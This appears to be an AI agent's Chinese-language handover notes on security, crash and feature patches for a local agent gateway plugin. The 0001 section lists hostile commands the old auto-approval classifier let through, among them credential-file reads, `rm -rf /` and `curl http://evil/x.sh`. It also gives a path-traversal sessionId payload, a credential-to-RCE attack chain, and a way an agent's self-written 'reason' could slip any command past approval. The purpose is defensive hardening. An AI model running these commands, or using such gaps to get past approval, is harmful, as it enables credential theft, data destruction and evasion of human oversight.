# 网关侧补丁（需要你来决定应用时机）

`dsh-server-plugin/` 被 **junction 链接进了正在运行的 dsh web 进程**：

```
~/.dsh/profiles/web/node_modules/dsh-mobile-bridge
  → LinkType: Junction
  → Target:   E:\workspace\个人\dsh_mobile\dsh-server-plugin
```

监听 3088 的进程就是 dsh web 本体（当前 PID 79784，`node …\@deepseek-ai\dsh\lib\bin.js web`，同时监听 3080 / 3081 / 3088）。

### ⚠️ 订正：热加载并不会发生（2026-10-08 实测）

本节原先写的是「改动 `lib/` 下任何文件都可能被 Cordis 热加载进活进程，等价于一次你没有同意的重启」。**这个判断是错的，而且方向刚好相反。**

实测依据：dsh 的文件监听用 chokidar，配置为

```js
ignored: ["**/node_modules", "**/.*", "cache", "data"]
```

而插件正是通过 `~/.dsh/profiles/web/node_modules/dsh-mobile-bridge` 这个 junction 被加载的 —— 路径里含 `node_modules`，**永远落在 ignored 之内**。对 `lib/index.js` 连续 touch 38 次做探针，活进程无任何反应，PID 未变、无重载日志。

结论：

- 编辑 junction 里的插件源码对运行中的 dsh web **完全惰性**，不会触发热加载，也不会导致意外重启；
- 反过来说，**改动要生效必须重启 dsh web**（只有你能做）；
- 所以「补丁会不会偷偷进活进程」不是风险点，真正的风险点是「你以为生效了其实没有」。这正是 App 端要做 `archivedMode` 能力探测的原因（见 0002）。

编辑期间仍需保持文件语法正确：万一 dsh web 因为**其他**原因在此期间重启，它会加载半写状态的插件并启动失败。所以每次改完都跑 `node --check lib/index.js`。

### 当前状态

| 补丁 | 状态 |
|---|---|
| 0001 安全与崩溃修复 | **已应用并生效** —— 你在 2026-10-08 重启了 dsh web，`core.mjs` 与 `index.js` 均为打过补丁的版本 |
| 0002 归档筛选 | **已应用并生效** —— 同一次重启加载；实测 `?archived=only` 正确回显 `archivedMode`，三态 `archivedCount` 恒为 1338 |
| 0003 事件转发（提问 / TODO / 附件 + 背压） | **已应用并生效** —— 2026-10-10 12:00 那次重启加载（网关版本当时为 1.3.1） |
| 0004 重度远程能力（v1.14.0，见下节） | **已写进 `lib/`，尚未生效** —— 需要你下一次重启 dsh web |

补丁生成过程中活文件一个字节都没被改过（0001 生成时 SHA256 前后一致：`index.js=CB1C57D0…`、`core.mjs=3D74A56E…`）。

---

## 0004-gateway-heavy-remote-capabilities（bridge 1.14.0）

**改动范围**：`lib/features.mjs`（新增）、`lib/index.js`、`lib/core.mjs`（仅版本号）、`lib/store.mjs`（新增 ntfy 配置字段）。

这一批为"重度手机远程操控"补齐网关侧能力。**App 侧从 v1.13.0 起就有对应界面**，但下面这些路由在老网关上不存在，
所以不重启的话：任务页五块全部为空、排队/插话会 404、ntfy 推送不会发出。**其余既有功能不受影响**（它们的路由没动）。

| 新路由 | 作用 | 关键约束 |
|---|---|---|
| `GET /api/mobile/sessions/queue` | 列出排队消息（inbox `next-turn`） | 只读投影，不激活 Agent |
| `POST /api/mobile/sessions/queue` | 编辑 / 删除 / 插话一条排队消息 | 引擎侧的裸动作在这里被校验：编辑必须非空文本 |
| `GET /api/mobile/schedules` | 列出会话的定时任务 | 走 `schedule/list` |
| `POST /api/mobile/schedules/delete` | 删除定时任务 | |
| `GET /api/mobile/jobs` | 列出后台作业 | `job/list` 是 **stream** RPC，只能在 MUX 上开流取首帧后立刻 cancel；取不到时如实返回 `degraded: jobs-unavailable` |
| `POST /api/mobile/jobs/kill` | 终止作业 | |
| `GET /api/mobile/deliverables` | 交付物清单 | 扫 `session/page` 里的 `deliverables/presented` 事件 |
| `GET /api/mobile/deliverables/download` | 下载交付物 | **只允许下载该会话声明过的路径**（精确成员判定，不做字符串过滤），否则 403 |
| `GET /api/mobile/workspace/changes` | 本次改动的文件 | 引擎的 `workspace/changes` 事件只带轮号（摘要留在 Host，RPC 拿不到），所以这里用 `git status/diff` 读工作树；非 git 仓库如实返回 `reason` |
| `GET /api/mobile/workspace/diff` | 单文件 diff | 路径必须先出现在变更列表里，否则 404 |
| `GET /api/mobile/session/stats` | 用量 / 上下文压力 / goal | 优先实时投影，取不到退回投影缓存并标注 `source` |
| `GET/POST /api/mobile/push/config` | ntfy 配置读写 | **绝不回显 token**，只回 `hasToken` |
| `POST /api/mobile/push/test` | 发一条测试推送 | |

**推送触发点**：审批请求、提问请求、回合结束（含失败）。点击推送打开 `dshmobile://open?session=…`，
App 声明的深链接会直达那个会话 —— 进程被杀时这是唯一能叫醒用户的路径（本地通知依赖进程存活）。

**顺带修掉**：`ws.on('message')` 的 `catch(_){}` 不再吞掉一切异常，改为记 warn（含帧头 200 字符）。


---

## 0001-gateway-p0-security-and-crash-fixes.patch

改 `dsh-server-plugin/lib/core.mjs` 和 `dsh-server-plugin/lib/index.js`，共 5 组修复。

### 1. 手机断网会打崩整个 dsh web（新发现，P0 可用性）

`lib/index.js` 的 `createServer(async (req,res) => …)`（L1125）**没有外层 try**。业务 try 在 L1330、catch 在 L1675，而 body 读取的 `throw err` 在 L1324 —— 夹在两者之间，直接逃逸出 async handler 变成 `unhandledRejection`。全文件 **0 处** `process.on('unhandledRejection')`，而 Node ≥ 15 默认 `--unhandled-rejections=throw`，即**终止进程**。

触发链：`core.mjs:777` 的 `req.on('error', err => reject(err))` **不带** `aborted: true`，所以 L1323 的 `if (err?.aborted || res.headersSent) return` 拦不住。

**不需要攻击者**：手机在 POST 上传途中断网 / 切 Wi-Fi / 运营商 NAT 超时 → `ECONNRESET` → dsh web 进程死亡 → 所有活跃会话一起没。3088 绑的是 `0.0.0.0`，远程可达。

修法：不再 rethrow，按客户端错误处理，返回 400 并记审计。

### 2. `auto-read` 分类器 15 条绕过（P0 安全）

默认策略就是 `auto-read`（`store.mjs:120-121`）。实测新旧对比：

| 命令 | 工具 | 旧 | 新 |
|---|---|---|---|
| `cat C:/Users/Administrator/.dsh/.credentials.yaml` | pwsh | **放行** | 拒绝 |
| `cat C:\Users\Administrator\.dsh\.credentials.yaml` | pwsh | **放行** | 拒绝 |
| `cat .env` | pwsh | **放行** | 拒绝 |
| `cat /etc/shadow` | pwsh | **放行** | 拒绝 |
| `cat android/key.properties` | pwsh | **放行** | 拒绝 |
| `cat release.jks` | pwsh | **放行** | 拒绝 |
| `type …\.dsh\.credentials.yaml` | read_file | **放行** | 拒绝 |
| `rm -rf /` | read_file | **放行** | 拒绝 |
| `del /f /q C:\Windows` | read_file | **放行** | 拒绝 |
| `anything at all` | read_file | **放行** | 拒绝 |
| `curl http://evil/x.sh` | list_dir | **放行** | 拒绝 |
| `find . -delete` | pwsh | **放行** | 拒绝 |
| `git log --output=/tmp/x` | git | **放行** | 拒绝 |
| `git log -o /tmp/x` | git | **放行** | 拒绝 |
| `echo hello` | pwsh | **放行** | 拒绝 |

**新堵住 15 条，残留 0 条，误伤 0 条**（39 条合法只读命令行为不变：`ls -la`、`cat README.md`、`grep -r TODO src`、`git status`、`git log --oneline -20`、`git diff`、`pwd`、`which node`、裸路径 `lib/main.dart` 等全部仍自动放行）。

四个根因：

- **`READ_ONLY_TOOLS.includes(toolName) → return true` 是函数第一行**。`toolName` 来自请求（即模型），根本不是信任锚点。现在命令必须凭自身通过白名单，工具名只在「没有命令行可分类」时才作数。
- **`find` / `echo` 从白名单移除**。`find <path> -delete`、`-exec` 里没有任何 shell 元字符，原来的元字符守卫看不见。
- **新增敏感路径黑名单**（`.dsh/`、`.credentials.yaml`、`mobile-bridge/config.json`、`.ssh/`、`id_rsa`、`.aws/credentials`、`.kube/config`、`.netrc`、`shadow`、`key.properties`、`*.jks/*.keystore/*.p12/*.pfx`、`.env`、dpapi/credhist），两种分隔符都覆盖。
- **新增危险 flag / 子命令表**：`--output`、`-o`、`-delete`、`-exec`、`-fprint` 等；`git push|reset|clean|checkout|commit|rebase|filter-branch|config|…`、`docker rm|run|exec|push`、`kubectl delete|apply|exec` 等。裸 `git` **没有**进黑名单 —— 那样会误伤 `git status`/`git log`/`git diff`，这是本仓库最常用的只读命令族（第一版补丁就犯了这个错，实测误伤 3 条后改成精确匹配子命令）。

完整攻击链（默认配置下即可走通，补丁后断在第 1 步）：
`cat C:\Users\<u>\.dsh\.credentials.yaml` → 无元字符 → `isCommandReadOnly` 判只读 → `index.js:981-990` 自动放行 → 输出经 `index.js:921` 广播给**所有**已连接客户端 → 拿到引擎 HMAC 密钥 → 伪造 `dsh-auth-*` cookie → 直连 3080 RPC = 宿主机 RCE，网关鉴权层完全不在路径上。

### 3. 会话级 `ask` 是安慰剂（P0 安全）

`index.js:968/971` 原来是：

```js
if (sessionPolicy === 'danger-full-access' || globalPermissions.executionPolicy === 'danger-full-access') { … }
else if (sessionPolicy === 'auto-read'      || globalPermissions.executionPolicy === 'auto-read')      { … }
```

但 `getSessionPermission()`（`index.js:250-252`）**已经**委托给 `permStore.forSession()`（`core.mjs:680-683`），后者本身就实现了正确的「会话优先、否则全局」语义。所以 L968/971 的 OR 不是「补充」，而是**把已经算对的有效策略又用全局值覆盖回去**。

后果：会话设 `ask`、全局 `auto-read`（出厂默认）→ `forSession` 正确返回 `'ask'` → OR 条件为真 → 照样自动放行。**App 里那个「单会话设为 ask」控件、以及 `setSessionPermission()` 对审批路径的全部影响，等于零。**

修法：只用 `effectivePolicy`，删掉 OR。

### 4. 分类的是模型自己写的理由，不是命令（P0 安全）

`index.js:972` 原来是 `let cmdToCheck = reason;`，`reason = val.request?.reason`，即**模型自述的申请理由**。只有当 `val.request.command` 恰好是字符串时才会被真实命令覆盖。所以理由写 `"ls"` 就能让任意命令在 `auto-read` 下自动放行。

同一行的审计记录 `command: reason`（L988）—— 审计日志里「命令」字段存的是模型的自述理由，这就是 §1.25「审计洗白」的来源，事后无法还原到底跑了什么。

修法：按 `request.command` → 字符串 input → input 的 `command|cmd|script|shell|argv|args` 字段顺序解析真实命令；**解析不出来就 fail closed**（不自动放行，并记 `approval/auto-approve-skipped` 审计）；审计字段改记真实命令 + 生效策略。

顺带修了 `sessionId` 的取值：`val.agent || val.agentId || 'default'` 补上 `|| val.sessionId || val.request?.sessionId`，减少落到 `'default'` 因而永远匹配不上真实会话的情况（这是审批红点从不亮、`removeBySession` 清不掉的原因之一）。

### 5. 路径消毒器 fail-open + sessionId 任意文件删除（P0 安全）

**消毒器**：`core.mjs:231` 原来是 `if (registeredPaths.length > 0) { …校验… }`。`getRegisteredWorkspaces()` 走 RPC 读引擎的工作区表，启动期、引擎重连后、任何 RPC 失败时都会**合法地返回 `[]`** —— 那些窗口里第 2 层校验被整段跳过，只剩第 1 层的字符串检查，而第 1 层拦不住绝对路径。等于「输入缺失时自动关闭的消毒器」，比没有消毒器更糟，因为看起来有。现在改成 fail-closed，返回 403。

同时给 `workspacePath` 补上原来只作用于 `fileName` 的检查：NUL / ASCII 控制字符、`\\?\` 与 `\\.\` 扩展长度与设备前缀（这三种都能让第 2 层的字符串比较与文件系统实际打开的路径不一致）。

**任意 `.json` 删除**：`deleteSession()` 用 `const clean = id.replace(/^session-/,'')` 拿到调用方原始输入，未做任何字符过滤，随后 `path.join(cacheDir, \`${clean}.json\`)` + `fs.unlinkSync`。`POST /api/mobile/sessions/delete {"sessionId":"../../../../storages/workspace"}` 就能删掉工作区表本身，或网关自己的 `mobile-bridge/config.json`。端点需要令牌，但令牌只是 8 字符共享密钥 —— 这是从「能和网关说话」到「能删宿主机文件」的提权。

修法：新增 `assertSessionId()`，`/^[A-Za-z0-9_-]{1,64}$/`。**实测 2321 个真实 session id 全部仍被接受，0 误伤**，删除功能不受影响。

**附带**：`global.archivedSessionIds` 原来无上限追加（实测已积累 1350 条）。`workspace.json` 是在 `getWorkspacesData()` 里同步解析的，而后者每个请求都跑，所以这个列表无界增长会给每一次 API 调用加税。现在上限 20000（`DSH_MAX_ARCHIVED_SESSIONS` 可调），从最旧开始淘汰，淘汰数通过返回值 `evicted` 交给调用方记审计。

> 取舍写清楚：淘汰会让很久以前删掉的会话重新可见。这严格优于存储文件无界增长。20000 远高于任何真实积累速度，正常情况下永远不该触发 —— 会触发就说明有失控循环，而那正是你想知道的时候。
>
> 另注：`core.mjs` **不能** import `store.mjs`（store 为了审计 sink 已经 import core，反向会成环，见 `core.mjs:28`），所以淘汰事件无法在 core 内部直接 `audit()`，改为返回 `evicted` 由 `index.js` 侧记录。第一版补丁在这里写了 `audit(...)`，会是 `ReferenceError`，已修掉。

---

## 0002-gateway-archived-session-filter.patch

只改 `dsh-server-plugin/lib/index.js`，`+66 / -9`，**基线是已应用 0001 的版本**，所以两个补丁互不掺杂、可分别回滚。已验证：`git apply --check` exit 0，且在隔离副本上套用后与当前工作树**逐字节相同**（79,523 B，纯 LF）。

对应 App 端 v1.4.0 的「会话归档筛选」。三组改动：

### 1. `getWorkspacesData(opts)` 支持归档三态

`?archived=exclude|only|include`，默认 `exclude`。

**默认值必须精确复现原行为**，这一点是有代价的：`index.js:154` 的路径守卫也调用 `getWorkspacesData()`（无参），它依赖看到的工作区列表和以前完全一致，否则工作区路径校验的语义会跟着变。所以 `mode` 的归一化写成「只认 `only` 和 `include`，其余一律 `exclude`」—— 缺参、拼错、以及 `url.parse` 把重复参数变成数组的情况，全部落到历史行为上。

过滤放在**服务端**而不是让 App 自己筛，理由是量级：本机 `workspace.json` 注册了 **2322** 个会话，其中 **1338** 个在 `global.archivedSessionIds` 里。无条件全返回会把一个被定时器反复拉取的响应放大 **2.4 倍**。客户端一次只要一种模式。

归档判定沿用原有的三种 id 写法（原样 id / 去掉 `session-` 前缀 / 补上前缀），只是从「命中就 `continue`」改成先记录 `isArchived` 再按模式决定去留，并顺带计数。

### 2. 回显 `archivedMode` —— 这是能力协商信号，不是装饰

```js
sendJson(200, { ok: true, code: 0, workspaces: data, archivedMode: archivedMode });
```

旧网关收到 `?archived=only` 会**静默忽略**并照常返回未归档列表。如果客户端不校验回显就直接渲染，等于把未归档会话贴上「已归档」标签展示给用户 —— 那不是功能缺失，是主动误导。

App 端因此以这个回显为准（`DshService.archivedFilterSupported`），不匹配时显式提示「下面列出的并不是已归档内容，需要在宿主机重启 dsh web」。

**刻意不用版本号做能力协商**：`AppVersion`（App）与 `BRIDGE_VERSION = '1.2.9'`（网关）是两套独立且已经漂移的编号（§1.8 记录了 13 处漂移）。版本字符串不是可靠的特性判据，回显才是。

同时每个会话多返回 `archived: isArchived`，每个工作区多返回 `archivedCount`（**在所有模式下都返回**，与请求的模式无关），这样 App 在看未归档列表时也能显示「已归档 1338 条」，不必再发一次请求。成本是每会话一次 Set 查找，无额外 I/O。

### 3. 修掉 `getSettingsData()` 的 N+1（原 §1.7 性能根因）

原代码在**会话循环内部**调用 `getSettingsData()` 来填 `model` 字段的兜底值。而 `getSettingsData()` 是一次同步 `readFileSync` + `YAML.parse`（读 `profiles/web/cordis.patch.yml`）。于是每次请求都要把同一个全局配置文件重新解析 N 遍 —— N = 缺 `model` 的会话数，且全程阻塞 Node 事件循环。

这是一个全局设置，按定义不可能随会话变化。改成惰性记忆化：**最多解析一次，且只在真的有会话需要时才解析**。

实测（`tests/unit/archived-filter.test.mjs`，1500 个刻意不带 `modelSelection` 的会话）：

| | 读 `cordis.patch.yml` 次数 |
|---|---|
| 修复前 | **1500** |
| 修复后 | **1** |

测试直接 monkey-patch `fs.readFileSync` 计数（`node:fs` 的默认导出可变），用真实的插件代码路径跑，不是估算。

### 为什么没有「取消归档」端点

一开始计划里有一个。查证后**主动删掉**，依据是 `dsh-session-list-empty` 这个 skill 记录的事实：

- 引擎侧**没有 unarchive RPC**；
- 手工恢复要改 `~/.dsh/storages/workspace.json` 并**完全重启 dsh**；
- 而且「旧实例会持续把 `workspace.json` 覆盖回内存里的旧值」。

所以在网关里做一个实时写 `workspace.json` 的端点，既是**无效写入**（会被运行中的实例覆盖回去），又是在一个存着全部 2322 条会话注册的文件上引入**数据丢失风险**。收益为负，不做。

### 一个决定功能可行性的前置测量

曾担心归档会话大多没有 projcache（因为 `deleteSession` 会删掉它），那样列表只会显示一串裸 id，功能近乎无用。实测结果相反：

| | 有 projcache | 比例 |
|---|---|---|
| 已归档会话 | 1338 / 1338 | **100%** |
| 未归档会话 | 880 / 984 | 89.4% |

推断：这 1338 条是经 Web UI 的 `workspace.archiveSession` RPC 归档的（它不碰 projcache），不是经网关的 `deleteSession`。**标题、时间戳都能正常渲染**，功能成立。

> 这也是个方法论提醒：动手前先量一下，别靠推断决定要不要做。

### 与 Web 端计数的已知差异（设计差异，不是 bug）

App 显示的数字**不会**等于 Web 侧边栏的数字。Web 的 `sessionVisible()` 有三重过滤：

1. `origin !== 'subagent'`
2. `!archived.has(id)`
3. `!blank || id === current`

再加上 `COLLAPSED_SESSION_LIMIT = 5` 的折叠。网关只做了 2 和 3，**没有过滤 `origin`**。在那台参考机器上 476/586 = 81% 的会话是 subagent 来源，所以两边差距可以很大。

这是有意的：App 是会话管理界面，把子代理会话一并列出更有用；Web 侧边栏是导航，需要压制噪音。但必须在 UI 上说清楚，否则会被当成 bug 报上来。

### 测试

`tests/unit/archived-filter.test.mjs`，**20 个用例全过**。它用 mock Cordis ctx 把真实插件加载起来，跑在 `mkdtempSync` 的隔离 `DSH_HOME` + OS 分配的临时空闲端口上 —— 不碰你正在运行的 dsh web，不建会话，不打 LLM。

覆盖三种 id 写法、三种模式的行数、`archivedCount` 的跨模式恒定性、空白会话在各模式下都被丢弃、以及上面的 N+1 计数。

网关单测总数：**117 pass / 0 fail**（core + delete-session + security-hardening + smoke-bridge + archived-filter）。

> 注意：`package.json` 的 `test:unit` 已加入这个文件，但 `tests/` 与 `package.json` **不在公开推送范围内**，所以 CI 不会跑它。这个门禁只在本地存在。

### 生效方式

已写进 `lib/index.js`，但**尚未生效** —— junction 路径不被 chokidar 监听（见上面的订正），必须重启 dsh web。在那之前 App 端会走 `archivedMode` 缺失的降级提示。

回滚（单独回滚 0002，保留 0001）：

```powershell
Copy-Item "$env:TEMP\dsh-plugin-backup-pre-archived-20261008-230417\index.js" `
          dsh-server-plugin\lib\index.js -Force
node --check dsh-server-plugin\lib\index.js
```

该备份是**已应用 0001、未应用 0002** 的状态（`index.js` 76,148 B，SHA256 前缀 `25E7761CE4D669F6`）。

---

## 0003-gateway-event-forwarding.patch

只改 `dsh-server-plugin/lib/index.js`，`+343 / -7`，**基线是已应用 0002 的版本**。已验证：`git apply --check` exit 0，隔离副本套用后与工作树**逐字节相同**（95,220 B，纯 LF）。

对应 App 端 v1.4.1 的「回答 Agent 提问 / TODO 进度条 / 图片渲染」，以及 ANALYSIS §4.1 那 19 项共同的前置。

### 为什么之前这些事件等于不存在

`handleUpstreamMuxMessage` 的两个分支（follow 流与 $events 流）都以裸 `return` 收尾，只认 `turn/start`、`turn/end`、`tool/call`、`tool/result`、`approval/request` 几种形状，其余一律丢弃。所以 §4.1 的三项功能不是「没做前端」，是**网关这一层根本没把它们送出来**。

### 关键设计：回答不走本地 Promise

`user-questions/request` 在引擎侧是 waterfall。直觉做法是网关本地存一个 Promise，等手机回答后 resolve —— **这个做法是错的**，而且错得很隐蔽：

- waterfall 的 `next` 续延函数无法穿过 JSON 帧，引擎那边根本收不到「你 resolve 了」这个事实；
- 因此本地 Promise 只能被手机自己的回调 resolve，对引擎完全不可见 → agent 永远挂起；
- 而这种实现**能通过绝大多数单测**，因为测试只验手机收到了问题帧。

所以正确通道是 `$events/result` + `{kind:'result', value:{answers:[...]}}`，和自动放行那条路径同形、且已在生产验证过。测试因此断言的是**真正离开进程的 RPC**（假引擎记录 `POST /api/$events/result` 的 method 与 payload），而不是「网关看起来处理了」。

### 明确不做的三件事（诚实性优先）

| 场景 | 行为 | 为什么不是别的 |
|---|---|---|
| 没有任何手机订阅者 | **不回答**，帧直接丢弃 | 回 `{answers:[]}` 等于告诉 agent「人回答了空内容」，是假话。不回答才能让 waterfall 落到 Web UI 的 answerer |
| 帧缺 `id` | 不回答，并写 `question/unanswerable` 审计 | 自己造一个 id 送回去必然被引擎拒；那是个坏死的承诺 |
| 重复作答 | 第二次返回 `ok:false` | 静默丢弃会让手机以为还在等；冒充成功会产生两次引擎状态变更 |

### 只发给订阅者，而不是全员广播

手机要显式 `subscribe_questions` 才会收到提问帧。否则第二台只是浏览会话列表的手机会被塞一堆它永远不会回答的提问，这些请求只能等超时。`broadcastToMobileClients` 保持原样（TODO 是会话级广播，不需要订阅）。

订阅时的 ack 会**回放仍在等待的问题**（`pending` 数组），避免手机在提问中途接入、看到一个像卡死的会话。回放前按 30 分钟 TTL 剪枝。

### 两条会话事件的处理位置

`todo/write` 与 `session/attachment` 我先挂在 `val.type==='request'|'waterfall'` 分支下，结果 4 个测试超时 —— 因为 `todo` 工具走的是 `exec.agent.session.append('todo/write')`，是**会话日志事件**，形状是 `{type:'event', event:'todo/write'}`。挂在 waterfall 分支下等于全部静默丢弃。

修法是抽 `forwardSessionEvent()`，在 follow 流和 $events 流两处都调用。只挂一处仍会漏：follow 分支末尾是裸 `return`，事件落在 follow 流上就没了，且**不报任何错**。这类「静默丢弃」最难查，所以两处都显式接上。

### 附件只转发元数据

图片走 `session/attachment` 载体，网关只转发 `{id, mimeType, width, height, bytes}` 等元信息，**字节留在宿主机**，手机通过已鉴权的附件路由去取。避免大 blob 跨 MUX 跳。

### 背压保护（`MAX_CLIENT_BUFFER_BYTES` / `shouldDivertForBackpressure`）

原先 `broadcastToMobileClients` 无条件 `ws.send()`，`catch(_){}` 静默吞错。这条连接没有第二个写入者（delta、tool_result、todo、提问帧都在上面），所以一旦手机掉线或只是比流式输出慢，发送缓冲会无限涨，最终**把整个 dsh web 拖垮**（连带该机器上所有会话）。

加阈值 8 MB：超过就关连接并从广播/订阅集合移除。阈值远高于任何健康突发（正常流会在网络带宽下排空）。

> 阈值判断抽成导出的纯函数 `shouldDivertForBackpressure`，因为 `bufferedAmount` 在真 socket 上是只读 getter，测试**没法**通过「狂发字节」稳定触发这个分支。不抽出来的唯一测试只会是 `assert.ok(closed || true)` 这种永远为真的假测试。纯函数版本直接测边界（含 `undefined`/`null`/字符串/`NaN`/`Infinity` 不误判）。

### 测试

`tests/unit/event-forwarding.test.mjs`，**18 个用例全过**。它起一个假引擎，同时提供：

- `/api/remote.mux` 的 WS 升级（按 `api-gateway` 的 `pump()` 原样发 item 帧）；
- `POST /api/$events/result` 的 HTTP 处理，记录 RPC 并回 `{result:{ok:true,value:{}}}`。

> 假引擎**必须**跑在空闲端口，**绝不能用 3080** —— 那是你正在运行的 dsh web 占着的。用 `internals.dshPort` 显式覆盖（这是 `apply()` 唯一暴露的覆写点）。测试后已确认 3080/3081/3088 仍由真实进程持有。

覆盖：无人订阅时保持沉默、缺 id 不转发、领取、作答（含 RPC 的 URL/method/outcome 断言）、未知 id 拒绝、重复作答只兑现一次、晚订阅回放、未订阅者收不到、订阅者断开后不再提供、背压阈值边界、TODO 整表广播 / 空数组广播 / 缺 payload 不广播、附件只传元数据、未知事件忽略且不打断后续处理。

网关单测总数：**135 pass / 0 fail**（117 + 18）。

> `package.json` 的 `test:unit` 已加入该文件并加 `--test-timeout=120000`；`tests/` 与 `package.json` **不在公开推送范围内**，所以 CI 不跑它，门禁只在本地。

### 生效方式

已写进 `lib/index.js`，但**尚未生效** —— junction 路径不被 chokidar 监听，必须重启 dsh web。

回滚（单独回滚 0003，保留 0001/0002）：

```powershell
Copy-Item "$env:TEMP\dsh-plugin-backup-pre-eventfwd-20261009-093100\index.js" `
          dsh-server-plugin\lib\index.js -Force
node --check dsh-server-plugin\lib\index.js
```

该备份是**已应用 0002、未应用 0003** 的状态（`index.js` 79,523 B，SHA256 前缀 `8C9D91A8DF459624`）。

---

## 应用方式

补丁已通过 `git apply --check`（exit 0，可干净应用）。

```powershell
cd E:\workspace\个人\dsh_mobile

# 1. 先看一眼会改什么（不写文件）
git apply --stat   patches\0001-gateway-p0-security-and-crash-fixes.patch
git apply --check  patches\0001-gateway-p0-security-and-crash-fixes.patch

# 2. 备份当前活文件
Copy-Item dsh-server-plugin\lib\core.mjs  $env:TEMP\core.mjs.bak
Copy-Item dsh-server-plugin\lib\index.js  $env:TEMP\index.js.bak

# 3. 应用
git apply patches\0001-gateway-p0-security-and-crash-fixes.patch
```

**应用时机由你决定。** 我不知道 dsh web 是否会热加载 junction 目录里的插件源码 —— 如果会，`git apply` 那一刻改动就进活进程了，效果等同于一次你没有主动发起的重启；如果不会，改动要等你下次重启 dsh web 才生效。**建议在你本来就打算重启 dsh web 的时候应用**，这样两种情况都安全。

### 验证（应用之后）

```powershell
npm test        # tests/unit/security-hardening.test.mjs 会自动从 skip 转为执行
```

这个测试文件**已经提交在仓库里**，设计成自动跳过：它检测 `core.assertSessionId` / `core.classifyCommand` 是否存在，不存在就整块 skip 并打印原因。所以：

- **未打 0001 时**：`npm test` → 53 pass / 0 fail，3 个 describe 块 skip，套件全绿
- **打了 0001**：同样的命令 → 88 pass / 0 fail，0 skip
- **再打上 0002（= 当前工作树状态）**：**117 pass / 0 fail，0 skip**

前两个数字是 0001 当时的实测值；第三个是 2026-10-08 在当前工作树上的实测值，其中 `archived-filter.test.mjs` 贡献 20 个。0001 的验证当初是在 `%TEMP%` 的隔离副本上跑的（把打补丁后的 `core.mjs` 和测试文件复制到一个临时目录树里执行），全程没有触碰 junction 里的活文件。88 个通过里包含原有 7 个 `deleteSession` 用例和全部 `core.test.mjs` 用例，**零回归**。

### 回滚

```powershell
Copy-Item $env:TEMP\core.mjs.bak  dsh-server-plugin\lib\core.mjs  -Force
Copy-Item $env:TEMP\index.js.bak  dsh-server-plugin\lib\index.js  -Force
```

回滚后 `npm test` 会自动退回 53 pass / 3 skip，不需要动测试文件。

---

## 补丁没有覆盖的部分

`index.js` 里还有几处 Batch 0 范围内的缺陷**没有**进这个补丁，因为它们要么需要更大范围重构、要么依赖你对行为的取舍：

- `index.js:1083` 先 `coreApprovals.remove()` 再 `await callDshRpc('$events/result')`（L1092），RPC 失败只在 L1102-1104 warn，L1106 照样广播，L1601-1602 恒返回 HTTP 200 —— 审批状态机对客户端谎报成功。修它要改审批响应的事务顺序，会影响 App 端行为，建议单独一批。
- ~~`index.js:923-925` 的裸 `return` 丢弃约 80% 引擎事件（含 `user-questions/request`，导致会话永久挂起）~~ —— **已由 0003 部分修复**：`user-questions/request`、`todo/write`、`session/attachment` 三类已接通。但更广的 §1.5 事件转发表仍需单独设计（还有 ~250 个事件名，其中大部分是网关无关的内部/gateway 层事件）。
- ~~`index.js:438-540 getWorkspacesData()` 在会话循环内部（L507）调 `getSettingsData()`~~ —— **已由 0002 修复**（记忆化后从 N 次降为 1 次，实测 1500 → 1）。
- `index.js:747-754 broadcastToMobileClients` 无订阅过滤、无 `bufferedAmount` 背压检查、`catch(_){}` 静默吞错 —— §6.2。
- `core.mjs:98` cookie 24h TTL 且 `index.js:1810` 的 `refreshCookie()` 只在启动时调一次；`core.mjs:152-164` 的 RPC 调用方忽略 `res.statusCode`。
- `store.mjs:68-70` 空令牌时 `generateToken()` **不落盘**，直接自锁；`store.mjs:105-113 verifyToken` 从不读 `devices.json`，且全仓库 **0 处** `timingSafeEqual`。
- `core.mjs:731` 硬编码 `{ok:true, device:{id:'admin', name:'移动终端', role:'readwrite'}}` —— 配对校验形同虚设（§1.23）。
- `index.js:1187-1188` APK 兜底路径指向 `../dsh-agent-v1.2.6.apk` / `../../dsh-agent-v1.2.0.apk`，全新克隆必 404（§1.16）。

---

## 只能由你执行的三项（需要重启 dsh web 或外部操作）

这三项我**没有**也**不会**执行。

### A. 轮换引擎 HMAC 密钥 —— 需要重启 dsh web

`~/.dsh/.credentials.yaml` 里的 `secret`（长度 43）**就是当前在用的引擎签名密钥**，实测 `当前引擎 secret == 泄露值 → True`。它存在于 git 历史的 **3 个 commit**：`c411a7f`、`1dc8a24`、`5e95a6d`（`git log --all -S` 三个都返回）。磁盘上的 `index.js.legacy` 我已删除，但**历史里还在**。

密钥持有者可以伪造 `dsh-auth-*` cookie 直连 3080，网关鉴权层完全不在路径上 = 宿主机 RCE。

1. 生成新密钥并写入 `~/.dsh/.credentials.yaml`
2. **重启 dsh web**（只有你能做）
3. 验证轮换成功 —— 指纹应该变化：

```powershell
cd E:\workspace\个人\dsh_mobile
node dsh-server-plugin\scripts\check-secret.mjs
```

轮换前当前指纹是 `sha256:8521a386d68d…`（长度 43，来源 `.credentials.yaml`）。这个脚本我已经脱敏过：原来它会把密钥的**前 8 位和前 12 位**打印到 stdout，任何 CI 日志、agent 对话记录或终端回滚缓冲都会留下可用前缀。现在只输出 sha256 指纹 + 长度，足够判断「换了没有」和「哪个文件生效」，不泄露任何一个字符。

> 顺带：这个脚本的正则 `/^\s*secret\s*:\s*['"]?([^'"\s#]+)/mi` 会匹配**任何**名为 `secret` 的键，`lib/index.js:99-105` 用的是同一个正则。所以 `settings.yaml` 里某个 MCP server 的 `secret:` 字段可能被当成引擎密钥读走，之后所有 RPC 静默返回 `unauthorized` 且日志里看不出原因。脚本现在会对这种情况打警告，但 `lib/index.js` 里的那处需要单独修（不在本补丁内）。

4. 彻底清除历史需要 `git filter-repo` + 强推，会改写全部 commit hash。**在你决定之前不要做**，因为它会让所有已克隆的副本失效。

### B. 轮换网关令牌 —— 不需要重启，但会立刻踢掉手机

`~/.dsh/mobile-bridge/config.json` 的 8 字符令牌（前缀 `6156***`）。`loadConfig()` 每次调用都重读，所以**改了立即生效、不用重启** —— 但也意味着已连接的手机会当场掉线，需要在 App 里重填。

时机由你定。改完记得同步更新手机 App 的连接配置。

### C. 吊销 GitHub PAT —— 只能你在网页上做

`.git/config` 里的 `ghp_…` 我已经剥掉了（`git remote set-url origin https://github.com/ccleeyx-cyber/dsh-mobile.git`，`credential.helper = manager` 所以推送仍然可用）。但**那个 token 本身还有效**，需要你去 GitHub → Settings → Developer settings → Personal access tokens 手动吊销。

